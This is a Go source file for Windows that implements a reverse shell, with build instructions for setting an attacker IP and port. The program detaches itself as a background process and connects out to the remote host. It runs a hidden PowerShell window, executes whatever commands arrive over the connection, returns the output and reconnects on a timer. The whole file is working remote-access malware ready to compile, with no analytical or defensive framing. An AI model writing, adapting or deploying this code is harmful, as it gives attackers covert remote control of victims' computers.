//go:build windows
// +build windows

/*
## Usage

bash

go build -ldflags="-X main.ip=192.168.0.10 -X main.port=4444 -X main.reconnectInterval=60 -X main.maxReconnectTries=5"



If the reconnectInterval and maxReconnectTries are not set it will not attempt any persistent connections.

## Code

go*/

package main

import (
	"bufio"

	"net"

	"os"

	"os/exec"

	"strconv"

	"strings"

	"syscall"

	"time"
)

const daemonFlag = "-daemon"

var (
	ip = "default_ip"

	port = "default_port"

	reconnectInterval = "-1" // default to no reconnect if not set

	maxReconnectTries = "-1" // default to no retries if not set

	currentReconnects int
)

func main() {

	if len(os.Args) > 1 && os.Args[1] == daemonFlag {

		// This is the child process, which will run the reverse function

		reverse(ip + ":" + port)

	} else {

		// This is the parent process

		startUnattachedProcess()

	}

}

func startUnattachedProcess() {

	cmd := exec.Command(os.Args[0], daemonFlag)

	cmd.SysProcAttr = &syscall.SysProcAttr{

		// Create a new process group

		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}

	err := cmd.Start()

	if err != nil {

		panic(err)

	}

	// Parent process exits immediately

}

func reverse(host string) {

	c, err := net.Dial("tcp", host)

	if err != nil {

		interval, _ := strconv.Atoi(reconnectInterval)

		tries, _ := strconv.Atoi(maxReconnectTries)

		if interval == -1 || tries == -1 {

			return

		}

		if currentReconnects < tries {

			time.Sleep(time.Duration(interval) * time.Second)

			currentReconnects++

			reverse(host)

		}

		return

	}

	currentReconnects = 0

	defer c.Close() // Ensure the connection closes when the function returns

	// Initialize a single PowerShell process and set up pipes

	cmd := exec.Command("powershell")

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	stdin, _ := cmd.StdinPipe()

	stdout, _ := cmd.StdoutPipe()

	stderr, _ := cmd.StderrPipe()

	cmd.Start()

	go func() {

		// Read from stdout and send it back to the connection

		buffer := make([]byte, 1024)

		for {

			bytesRead, err := stdout.Read(buffer)

			if err != nil {

				break

			}

			c.Write(buffer[:bytesRead])

		}

	}()

	go func() {

		// Read from stderr and send it back to the connection

		buffer := make([]byte, 1024)

		for {

			bytesRead, err := stderr.Read(buffer)

			if err != nil {

				break

			}

			c.Write(buffer[:bytesRead])

		}

	}()

	r := bufio.NewReader(c)

	for {

		order, err := r.ReadString('\n')

		if err != nil {

			interval, _ := strconv.Atoi(reconnectInterval)

			tries, _ := strconv.Atoi(maxReconnectTries)

			if interval == -1 || tries == -1 {

				return

			}

			// If there's an error reading from the connection, close all pipes and terminate the function

			stdin.Close()

			stdout.Close()

			stderr.Close()

			cmd.Wait() // Ensure the PowerShell process finishes

			if currentReconnects < tries {

				time.Sleep(time.Duration(interval) * time.Second)

				currentReconnects++

				reverse(host)

			}

			return

		}

		// Send the received order to the persistent PowerShell process, trimming the newline character first

		stdin.Write([]byte(strings.TrimRight(order, "\r\n") + "\n"))

	}

}
